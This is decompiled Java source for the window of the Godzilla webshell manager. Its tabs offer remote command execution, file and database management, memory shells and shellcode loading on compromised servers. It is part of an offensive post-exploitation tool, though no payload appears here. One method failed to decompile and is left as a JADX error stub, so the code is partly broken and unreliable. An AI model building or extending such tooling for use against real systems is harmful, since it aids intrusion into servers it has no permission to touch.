package net.BeichenDream.Godzilla.core.ui;

import net.BeichenDream.Godzilla.core.ApplicationContext;
import net.BeichenDream.Godzilla.core.Db;
import net.BeichenDream.Godzilla.core.annotation.PluginAnnotation;
import net.BeichenDream.Godzilla.core.imp.Plugin;
import net.BeichenDream.Godzilla.core.shell.ShellEntity;
import net.BeichenDream.Godzilla.core.ui.component.ShellBasicsInfo;
import net.BeichenDream.Godzilla.core.ui.component.ShellDatabasePanel;
import net.BeichenDream.Godzilla.core.ui.component.ShellExecCommandPanel;
import net.BeichenDream.Godzilla.core.ui.component.ShellFileManager;
import net.BeichenDream.Godzilla.core.ui.component.ShellNetstat;
import net.BeichenDream.Godzilla.core.ui.component.ShellNote;
import java.lang.reflect.Method;
import java.util.HashMap;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import net.BeichenDream.Godzilla.util.Log;
import net.BeichenDream.Godzilla.util.functions;

public class ShellManage extends JFrame {
    private static final HashMap<String, String> CN_HASH_MAP = new HashMap<>();
    private HashMap<String, Plugin> pluginMap = new HashMap<>();
    private ShellBasicsInfo shellBasicsInfo;
    private ShellDatabasePanel shellDatabasePanel;
    private ShellEntity shellEntity;
    private ShellExecCommandPanel shellExecCommandPanel;
    private ShellFileManager shellFileManager;
    private ShellNetstat shellNetstat;
    private JTabbedPane tabbedPane;

    static {
        CN_HASH_MAP.put("MemoryShell", "内存SHELL");
        CN_HASH_MAP.put("JRealCmd", "虚拟终端");
        CN_HASH_MAP.put("CRealCmd", "虚拟终端");
        CN_HASH_MAP.put("Screen", "屏幕截图");
        CN_HASH_MAP.put("CShapDynamicPayload", "ShellCode加载");
        CN_HASH_MAP.put("PZipE", "Zip管理");
        CN_HASH_MAP.put("CZipE", "Zip管理");
        CN_HASH_MAP.put("JZipE", "Zip管理");
        CN_HASH_MAP.put("P_Eval_Code", "代码执行");
        CN_HASH_MAP.put("payload", "有效载荷");
        CN_HASH_MAP.put("secretKey", "密钥");
        CN_HASH_MAP.put("password", "密码");
        CN_HASH_MAP.put("cryption", "加密器");
        CN_HASH_MAP.put("PROXYHOST", "代理主机");
        CN_HASH_MAP.put("PROXYPORT", "代理端口");
        CN_HASH_MAP.put("CONNTIMEOUT", "连接超时");
        CN_HASH_MAP.put("READTIMEOUT", "读取超时");
        CN_HASH_MAP.put("PROXY", "代理类型");
        CN_HASH_MAP.put("REMARK", "备注");
        CN_HASH_MAP.put("ENCODING", "编码");
    }

    public ShellManage(String shellId) {
        this.shellEntity = Db.getOneShell(shellId);
        this.tabbedPane = new JTabbedPane();
        setTitle(String.format("Url:%s 有效载荷:%s 加密器:%s", this.shellEntity.getUrl(), this.shellEntity.getPayload(), this.shellEntity.getCryption()));
        if (this.shellEntity.initShellOpertion()) {
            init();
            return;
        }
        setTitle("初始化失败");
        JOptionPane.showMessageDialog(this.shellEntity.getFrame(), "初始化失败", "提示", 2);
        dispose();
    }

    private void init() {
        this.shellEntity.setFrame(this);
        initComponent();
    }

    private void initComponent() {
        JTabbedPane jTabbedPane = this.tabbedPane;
        ShellBasicsInfo shellBasicsInfo2 = new ShellBasicsInfo(this.shellEntity);
        this.shellBasicsInfo = shellBasicsInfo2;
        jTabbedPane.addTab("基础信息", shellBasicsInfo2);
        JTabbedPane jTabbedPane2 = this.tabbedPane;
        ShellExecCommandPanel shellExecCommandPanel2 = new ShellExecCommandPanel(this.shellEntity);
        this.shellExecCommandPanel = shellExecCommandPanel2;
        jTabbedPane2.addTab("命令执行", shellExecCommandPanel2);
        JTabbedPane jTabbedPane3 = this.tabbedPane;
        ShellFileManager shellFileManager2 = new ShellFileManager(this.shellEntity);
        this.shellFileManager = shellFileManager2;
        jTabbedPane3.addTab("文件管理", shellFileManager2);
        JTabbedPane jTabbedPane4 = this.tabbedPane;
        ShellDatabasePanel shellDatabasePanel2 = new ShellDatabasePanel(this.shellEntity);
        this.shellDatabasePanel = shellDatabasePanel2;
        jTabbedPane4.addTab("数据库管理", shellDatabasePanel2);
        this.tabbedPane.addTab("网络详情", new ShellNetstat(this.shellEntity));
        this.tabbedPane.addTab("笔记", new ShellNote(this.shellEntity));
        loadPlugins();
        add(this.tabbedPane);
        functions.setWindowSize(this, 1690, 680);
        setLocationRelativeTo(MainActivity.getFrame());
        setVisible(true);
        setDefaultCloseOperation(2);
    }

    public static String getCNName(String name) {
        for (String key : CN_HASH_MAP.keySet()) {
            if (key.toUpperCase().equals(name.toUpperCase())) {
                return CN_HASH_MAP.get(key);
            }
        }
        return name;
    }

    private String getPluginName(Plugin p) {
        return ((PluginAnnotation) p.getClass().getAnnotation(PluginAnnotation.class)).Name();
    }

    private void loadPlugins() {
        Plugin[] plugins = ApplicationContext.getAllPlugin(this.shellEntity.getPayload());
        for (int i = 0; i < plugins.length; i++) {
            try {
                Plugin plugin = plugins[i];
                plugin.init(this.shellEntity);
                this.tabbedPane.addTab(getCNName(getPluginName(plugin)), plugin.getView());
                this.pluginMap.put(getPluginName(plugin), plugin);
            } catch (Exception e) {
                Log.error(e);
            }
        }
    }

    public Plugin getPlugin(String pluginName) {
        return this.pluginMap.get(pluginName);
    }

    /*  JADX ERROR: MOVE_RESULT instruction can be used only in fallback mode
        jadx.core.utils.exceptions.CodegenException: MOVE_RESULT instruction can be used only in fallback mode
        	at jadx.core.codegen.InsnGen.fallbackOnlyInsn(InsnGen.java:604)
        	at jadx.core.codegen.InsnGen.makeInsnBody(InsnGen.java:542)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:230)
        	at jadx.core.codegen.InsnGen.addWrappedArg(InsnGen.java:119)
        	at jadx.core.codegen.InsnGen.addArg(InsnGen.java:103)
        	at jadx.core.codegen.InsnGen.generateMethodArguments(InsnGen.java:806)
        	at jadx.core.codegen.InsnGen.makeInvoke(InsnGen.java:746)
        	at jadx.core.codegen.InsnGen.makeInsnBody(InsnGen.java:367)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:249)
        	at jadx.core.codegen.InsnGen.makeInsn(InsnGen.java:217)
        	at jadx.core.codegen.RegionGen.makeSimpleBlock(RegionGen.java:110)
        	at jadx.core.codegen.RegionGen.makeRegion(RegionGen.java:56)
        	at jadx.core.codegen.RegionGen.makeSimpleRegion(RegionGen.java:93)
        	at jadx.core.codegen.RegionGen.makeRegion(RegionGen.java:59)
        	at jadx.core.codegen.MethodGen.addRegionInsns(MethodGen.java:244)
        	at jadx.core.codegen.MethodGen.addInstructions(MethodGen.java:237)
        	at jadx.core.codegen.ClassGen.addMethodCode(ClassGen.java:342)
        	at jadx.core.codegen.ClassGen.addMethod(ClassGen.java:295)
        	at jadx.core.codegen.ClassGen.lambda$addInnerClsAndMethods$2(ClassGen.java:264)
        	at java.util.stream.ForEachOps$ForEachOp$OfRef.accept(ForEachOps.java:184)
        	at java.util.ArrayList.forEach(ArrayList.java:1259)
        	at java.util.stream.SortedOps$RefSortingSink.end(SortedOps.java:390)
        	at java.util.stream.Sink$ChainedReference.end(Sink.java:258)
        */
    public void dispose() {
        /*
            r2 = this;
            core.ui.ShellManage.super.dispose()
            java.util.HashMap<java.lang.String, core.imp.Plugin> r0 = r2.pluginMap
            java.util.Set r0 = r0.keySet()
            r1 = move-result
            r0.forEach(r1)
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: core.ui.ShellManage.dispose():void");
    }

    private /* synthetic */ void lambda$dispose$0(String key) {
        Plugin plugin = this.pluginMap.get(key);
        try {
            Method method = functions.getMethodByClass(plugin.getClass(), "closePlugin", null);
            if (method != null) {
                method.invoke(plugin, null);
            }
        } catch (Exception e) {
            Log.error(e);
        }
    }
}
